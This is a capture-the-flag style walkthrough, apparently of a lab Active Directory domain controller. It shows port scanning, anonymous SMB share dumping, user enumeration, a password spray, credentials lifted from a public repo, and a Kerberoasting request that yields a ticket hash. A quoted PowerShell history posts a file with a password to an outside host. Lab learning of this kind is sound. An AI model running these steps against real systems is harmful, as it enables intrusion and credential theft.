
# Lets check open ports on the given machine

┌──(kali㉿kali)-[~]
└─$ `nmap 10.10.90.60 -p- --open`
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-06 07:19 EDT
Nmap scan report for 10.10.90.60
Host is up (0.15s latency).
Not shown: 65383 closed tcp ports (conn-refused), 123 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
7990/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49677/tcp open  unknown
49701/tcp open  unknown
49713/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 70.42 seconds

# we can see we have a couple of ports open, including `88` which is for `Kerberos authentication things`. so, most likely it is the `domain controller`.

# Now let's try to run NMAP, to get more details, like the domain name from LDAP and the service version

┌──(kali㉿kali)-[~]
└─$ `nmap 10.10.90.60 -p- --open -sV -sC`
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-06 07:24 EDT
Nmap scan report for 10.10.90.60
Host is up (0.15s latency).
Not shown: 64885 closed tcp ports (conn-refused), 620 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-06 11:25:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2024-06-05T11:16:24
|_Not valid after:  2024-12-05T11:16:24
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-06T11:26:48+00:00
|_ssl-date: 2024-06-06T11:26:55+00:00; +2s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7990/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49833/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2024-06-06T11:26:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.98 seconds


# we can see we got the domain name from the RDP port (3389) i.e `LAB.ENTERPRISE.THM`, now first let's add this domain name to our /etc/hosts

# First let's enumerate SMB port. Let's first try to list the shares, with NULL Session.

┌──(kali㉿kali)-[~]
└─$ `smbmap -u guest -H 10.10.90.60   `

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.90.60:445 Name: LAB.ENTERPRISE.THM        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Docs                                                    READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   READ ONLY       Users Share. Do Not Touch!

┌──(kali㉿kali)-[~]
└─$ `smbclient -L  10.10.90.60`
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.90.60 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


# We can see interesting shares `Users`, `Docs`, Lets enumerate ther content manually first, since guest/anonymous access is allowed so password is not needed

┌──(kali㉿kali)-[~]
└─$ `smbmap -u anonymous -H 10.10.90.60 -r 'Users' `                                 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.90.60:445 Name: LAB.ENTERPRISE.THM        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Docs                                                    READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   READ ONLY       Users Share. Do Not Touch!
        ./Users
        dw--w--w--                0 Thu Mar 11 21:11:49 2021    .
        dw--w--w--                0 Thu Mar 11 21:11:49 2021    ..
        dr--r--r--                0 Thu Mar 11 16:55:47 2021    Administrator
        dr--r--r--                0 Thu Mar 11 19:17:03 2021    All Users
        dr--r--r--                0 Thu Mar 11 19:28:06 2021    atlbitbucket
        dr--r--r--                0 Thu Mar 11 21:11:51 2021    bitbucket
        dw--w--w--                0 Thu Mar 11 22:52:19 2021    Default
        dr--r--r--                0 Thu Mar 11 19:17:03 2021    Default User
        fr--r--r--              174 Thu Mar 11 19:15:55 2021    desktop.ini
        dr--r--r--                0 Thu Mar 11 22:56:23 2021    LAB-ADMIN
        dw--w--w--                0 Thu Mar 11 16:27:02 2021    Public



┌──(kali㉿kali)-[~]
└─$ `smbclient //10.10.90.60/Users -U guest `
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
            
smb: \> `ls`
  .                                  DR        0  Thu Mar 11 21:11:49 2021
  ..                                 DR        0  Thu Mar 11 21:11:49 2021
  Administrator                       D        0  Thu Mar 11 16:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
  Default                           DHR        0  Thu Mar 11 19:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
  Public                             DR        0  Thu Mar 11 16:27:02 2021

                15587583 blocks of size 4096. 9923093 blocks available
smb: \> `exit`



# Since there is a lot to check, let's dump those data using `mget` locally on our machine. to enumerate more efficiently.


smb: \> recurse ON
smb: \> mask ""
smb: \> prompt OFF
smb: \> mget *

# Now we can check files we have got in dump

┌──(kali㉿kali)-[/tmp]
└─$ `tree`

├── LAB-ADMIN
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Microsoft
│   │   │   │   ├── Credentials
│   │   │   │   │   └── DFBE70A7E5CC19A398EBF1B96859CE5D
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TM.blf
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000001.regtrans-ms
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000002.regtrans-ms
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   └── Temp
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Credentials
│   │           ├── Crypto
│   │           │   └── RSA
│   │           │       └── S-1-5-21-2168718921-3906202695-65158103-1000
│   │           │           └── 83aa4cc77f591dfc2374580bbd95f6ba_baebb989-4cb7-4d0b-89c2-ad186800b0f6
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           ├── Protect
│   │           │   ├── CREDHIST
│   │           │   └── S-1-5-21-2168718921-3906202695-65158103-1000
│   │           │       ├── 655a0446-8420-431a-a5d7-2d18eb87b9c3
│   │           │       └── Preferred
│   │           ├── SystemCertificates
│   │           │   └── My
│   │           │       ├── AppContainerUserCertRead
│   │           │       ├── Certificates
│   │           │       ├── CRLs
│   │           │       └── CTLs
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Powershell
│   │               │   └── PSReadline
│   │               │       └── Consolehost_hisory.txt
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               │           ├── desktop.ini
│   │               │           ├── Windows PowerShell ISE.lnk
│   │               │           ├── Windows PowerShell ISE (x86).lnk
│   │               │           ├── Windows PowerShell.lnk
│   │               │           └── Windows PowerShell (x86).lnk
│   │               └── Templates


# In  `Consolehost_hisory.txt`  we found creds

┌──(kali㉿kali)-[/tmp]
└─$ `cat /tmp/LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt`
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit           

# Lets validate creds`"replication:101RepAdmin123!!"`

┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec smb  10.10.130.255 -u 'replication' -p '101RepAdmin123!!'                           
SMB         10.10.130.255   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.130.255   445    LAB-DC           [-] LAB.ENTERPRISE.THM\replication:101RepAdmin123!! STATUS_LOGON_FAILURE 

# Didnt worked, this means its not correct, seems like username is not correct, Lets find all users and do password spray attack

# since we have `read access on IPC$`, we can enumerate users either by using `crackmapexec , or impacket-lookupsid.py` . 

┌──(kali㉿kali)-[/tmp]
└─$ `crackmapexec smb  10.10.130.255 -u 'guest' -p '' --users `                                        
SMB         10.10.130.255   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.130.255   445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest: 
SMB         10.10.130.255   445    LAB-DC           [-] Error enumerating domain users using dc ip 10.10.130.255: NTLM needs domain\username and a password
SMB         10.10.130.255   445    LAB-DC           [*] Trying with SAMRPC protocol


Lets try using impacket-lookupsid , it basically bruteforce RID to get users

┌──(kali㉿kali)-[/tmp]
└─$ `impacket-lookupsid 'guest'@10.10.130.255`
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.130.255
[*] StringBinding ncacn_np:10.10.130.255[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2168718921-3906202695-65158103
500: LAB-ENTERPRISE\Administrator (SidTypeUser)
501: LAB-ENTERPRISE\Guest (SidTypeUser)
502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
1107: LAB-ENTERPRISE\nik (SidTypeUser)
1108: LAB-ENTERPRISE\replication (SidTypeUser)
1109: LAB-ENTERPRISE\spooks (SidTypeUser)
1110: LAB-ENTERPRISE\korone (SidTypeUser)
1111: LAB-ENTERPRISE\banana (SidTypeUser)
1112: LAB-ENTERPRISE\Cake (SidTypeUser)
1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
1117: LAB-ENTERPRISE\varg (SidTypeUser)
1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
1119: LAB-ENTERPRISE\joiner (SidTypeUser)



# Lets save these in a file and Pasword Spray
┌──(kali㉿kali)-[/tmp]
└─$ impacket-lookupsid 'guest'@10.10.130.255 | cut -d " " -f 2 > usernames.txt
Password:
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp]
└─$ cat usernames.txt                                                                                
v0.11.0

Brute
StringBinding
Domain
LAB-ENTERPRISE\Administrator
LAB-ENTERPRISE\Guest
LAB-ENTERPRISE\krbtgt
LAB-ENTERPRISE\Domain
LAB-ENTERPRISE\Domain
LAB-ENTERPRISE\Domain
LAB-ENTERPRISE\Domain
LAB-ENTERPRISE\Domain
LAB-ENTERPRISE\Cert
LAB-ENTERPRISE\Group
LAB-ENTERPRISE\Read-only
LAB-ENTERPRISE\Cloneable
LAB-ENTERPRISE\Protected
LAB-ENTERPRISE\Key
LAB-ENTERPRISE\RAS
LAB-ENTERPRISE\Allowed
LAB-ENTERPRISE\Denied
LAB-ENTERPRISE\atlbitbucket
LAB-ENTERPRISE\LAB-DC$
LAB-ENTERPRISE\DnsAdmins
LAB-ENTERPRISE\DnsUpdateProxy
LAB-ENTERPRISE\ENTERPRISE$
LAB-ENTERPRISE\bitbucket
LAB-ENTERPRISE\nik
LAB-ENTERPRISE\replication
LAB-ENTERPRISE\spooks
LAB-ENTERPRISE\korone
LAB-ENTERPRISE\banana
LAB-ENTERPRISE\Cake
LAB-ENTERPRISE\Password-Policy-Exemption
LAB-ENTERPRISE\Contractor
LAB-ENTERPRISE\sensitive-account
LAB-ENTERPRISE\contractor-temp
LAB-ENTERPRISE\varg
LAB-ENTERPRISE\adobe-subscription
LAB-ENTERPRISE\joiner



# Remove unnecesory from list and run password spray

──(kali㉿kali)-[/tmp]
└─$ crackmapexec smb  10.10.130.255 -u usernames.txt -p '101RepAdmin123!!' 
SMB         10.10.130.255   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\Administrator:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\Guest:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\krbtgt:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\LAB-DC$:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\ENTERPRISE$:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\bitbucket:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\nik:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\replication:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\spooks:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\korone:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\banana:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\Cake:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\varg:101RepAdmin123!! STATUS_LOGON_FAILURE 
SMB         10.10.130.255   445    LAB-DC           [-] LAB-ENTERPRISE\joiner:101RepAdmin123!! STATUS_LOGON_FAILURE 


# No user worked, with this password

*******************************************************************************************************************
# Lets move to port 80

──(kali㉿kali)-[/tmp]
└─$` curl http://10.10.130.255/ `       

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<h1> Enterprise Domain Controller. Keep out! </h1>
</html>  

# Ok Its DC

┌──(kali㉿kali)-[/tmp]
└─$ `whatweb  http://10.10.130.255/       `                               
http://10.10.130.255/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.130.255], Microsoft-IIS[10.0]
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp]
└─$` dirb http://10.10.130.255/ `

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun  8 05:52:38 2024
URL_BASE: http://10.10.130.255/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.130.255/ ----
+ http://10.10.130.255/robots.txt (CODE:200|SIZE:110)                                                                                                                                                                                      
                                                                                                                                                                                                                                           
-----------------
END_TIME: Sat Jun  8 06:04:17 2024
DOWNLOADED: 4612 - FOUND: 1
                               

# only robots.txt found

┌──(kali㉿kali)-[/tmp]
└─$ `curl http://10.10.130.255/robots.txt`
Why would robots.txt exist on a Domain Controllers web server?
Robots.txt is for search engines, not for you!                                                                                                                                                                                                                                            
# lets check other ports with http service

47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7990/tcp  open  http          Microsoft IIS httpd 10.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# we found Github login page on 7990

# We dont get any thing after bruteforcing this web page, but we need to do some OSINT

# But the page says "Reminder to all Enterprise-THM Employees: We are moving to Github! "

# when we search "Enterprise-THM" on google as in to know about this organisation, we get a github repo, in which when we got ot people we get one user 

    Nik-enterprise-dev

# Further we found a script  qnd when we see hostory we found CREDS!!!!!!

    mgmtScript.ps1

$userName = 'nik'
$userPassword = 'ToastyBoi!'

# Lets validate them using crackmapexec

┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec smb  10.10.130.255 -u 'nik' -p 'ToastyBoi!'       
SMB         10.10.130.255   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.130.255   445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 

# This indeed aare valid

**************************************************************************************

# Now lets find if this user (bitbucket) is `Kerberostable`

Let’s check if user has a Service Principal Name (SPN) set. If an SPN is found, we can utilize our existing credentials as part of the domain to request the Ticket-Granting Service (TGS) key. The TGS key is encrypted using the password hash of the service. If we manage to crack this encryption, we would gain access to the user’s password.

┌──(kali㉿kali)-[/tmp]
└─$ `impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.130.255 -request`

Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$9904ae58ab703ae34d6557daaa11782c$b413a63b353c4b707b8688a80102a7d189987d7e66d9f976c29027341e743108196632b84b29794ab481c540b8234e9100ae5d14c63dbca14a28ab45efade152d9877508a3e34cf79f07685e4cb65b797823d3f87f71b895be5f087d8a13a200cf45905b045e9fec90dc5e3047b69c8a5b867be84272d9c162e178ef32a63d2da9bd8680b7957926044a135b65743f8d516f467dc8c270496efd6bf0092c2e74c5db8ba5abf4a46e0e108b6c787c3e29fc2bb1d4e9ad9a4d916e860ff3eafd6a02fc86f1e07a13dc8c3b1c8eda4dbe1064bdb4aef5367d3ff3efc70ba00e1000ec5d5e2c542a11fe4334800d3cbbaedd59fb43c5938a42feb0682891aa6ff3690b5747c4cff8675e7fc92aa13c6dcc826da7904382fac5368b510f259fb6decff7c84c731d9cdc14817424162653440ef74f3c523291030e1ae4128d30d0cd55adabab5ae6e1800630515e37ef380256d8d1c78138972b68c9e4b8492fee4649b3c413a2bb8e98e0ed885617d601f27b948f120de42a5d6d4837f64d12ae9616eded580c925fe831d947e38ad7571d09ecd510f905010735ef61c1742d139be67d60f0ebecd347d9e744e31074541d46db8d0df7e54ecbcccba80915fae86ed223263ebe8df5e55da3ee564f2169dd139068ba878bc798e0bb43ba0b5f29342ec1095487542c5a64b5331e1f6830b563be2689870fd227a53888f98afc9c6272a0ba89943892ff32b80cde810831be7ec0582ff56c4f8966b590d1da4a6b571643bfb506c3c29a9c0b902cce68e731a2655ee27aab2191a75c389e41fd00223330e10473c84e113c54aff1e0d5bbe8cf161494d601b72e03f54203be0dcda2836dae368a74d6e6d4b095d4b10046f2385ed9d4fa997eb2859680f8012e4e465f3e450ff0c5be6ff3c614d44733a5f49ab1ec62756434efc39c7b60a2ad816a21398db285a6a6d355beb59ce3b7e161962b557c580ec6c23bd25e20bfdc8a7881bee0dc6d2232a939fd838134cd62f1fa4050c65cb9700fcb54cd80d7b9afd8c71820c72f17320088d4d30ddefa5260f3814482b2b9d7f79fb8b399e5df4398ba059